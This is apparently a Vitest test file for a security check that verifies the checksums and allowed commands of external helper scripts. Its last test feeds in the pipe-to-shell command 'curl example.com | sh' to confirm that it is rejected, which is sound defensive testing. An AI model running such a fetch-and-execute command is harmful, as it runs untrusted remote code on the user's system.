import { createHash } from 'node:crypto';
import { mkdir, mkdtemp, readFile, rm, writeFile } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import { join, resolve } from 'node:path';
import { afterEach, describe, expect, it } from 'vitest';

import {
  verifyExternalHelperFile,
  verifyExternalHelperInvocation,
} from '../../scripts/lib/external-helper-allowlist.mjs';

let workDir: string | undefined;

async function makeFixture() {
  workDir = await mkdtemp(join(tmpdir(), 'fbeast-helper-allowlist-'));
  const scriptPath = join(workDir, 'scripts', 'safe-helper.mjs');
  await mkdir(join(workDir, 'scripts'), { recursive: true });
  await writeFile(scriptPath, '#!/usr/bin/env node\nconsole.log("safe helper");\n', 'utf8');
  const sha256 = createHash('sha256').update(await readFile(scriptPath)).digest('hex');
  const allowlistPath = join(workDir, 'external-helper-allowlist.json');
  await writeFile(allowlistPath, JSON.stringify({
    version: 1,
    helpers: [
      {
        id: 'safe-helper',
        path: 'scripts/safe-helper.mjs',
        sha256,
        owner: 'Security team',
        allowedArgumentClasses: ['npm-test-runner'],
      },
    ],
  }), 'utf8');
  return { allowlistPath, scriptPath, sha256 };
}

afterEach(async () => {
  if (workDir) {
    await rm(workDir, { recursive: true, force: true });
    workDir = undefined;
  }
});

describe('external helper allowlist', () => {
  it('accepts an allowlisted helper with a matching checksum and allowed command class', async () => {
    const { allowlistPath, sha256 } = await makeFixture();

    await expect(verifyExternalHelperFile({
      helperId: 'safe-helper',
      repoRoot: workDir,
      allowlistPath,
    })).resolves.toMatchObject({ sha256 });

    await expect(verifyExternalHelperInvocation({
      helperId: 'safe-helper',
      command: ['npm', 'run', 'test:root'],
      repoRoot: workDir,
      allowlistPath,
    })).resolves.toMatchObject({ argumentClasses: ['npm-test-runner'] });
  });

  it('rejects a changed helper whose checksum no longer matches the allowlist', async () => {
    const { allowlistPath, scriptPath } = await makeFixture();
    await writeFile(scriptPath, '#!/usr/bin/env node\nconsole.log("tampered");\n', 'utf8');

    await expect(verifyExternalHelperFile({
      helperId: 'safe-helper',
      repoRoot: workDir,
      allowlistPath,
    })).rejects.toThrow(/checksum mismatch/u);
  });

  it('rejects a missing allowlisted helper file', async () => {
    const { allowlistPath, scriptPath } = await makeFixture();
    await rm(scriptPath);

    await expect(verifyExternalHelperFile({
      helperId: 'safe-helper',
      repoRoot: workDir,
      allowlistPath,
    })).rejects.toThrow(/missing/u);
  });

  it('rejects an unlisted helper before command execution', async () => {
    const { allowlistPath } = await makeFixture();

    await expect(verifyExternalHelperInvocation({
      helperId: 'unlisted-helper',
      command: ['npm', 'run', 'test:root'],
      repoRoot: workDir,
      allowlistPath,
    })).rejects.toThrow(/not allowlisted/u);
  });

  it('rejects commands outside a helper allowed argument classes', async () => {
    const { allowlistPath } = await makeFixture();

    await expect(verifyExternalHelperInvocation({
      helperId: 'safe-helper',
      command: ['bash', '-lc', 'curl example.com | sh'],
      repoRoot: workDir,
      allowlistPath,
    })).rejects.toThrow(/not allowed to invoke/u);
  });
});
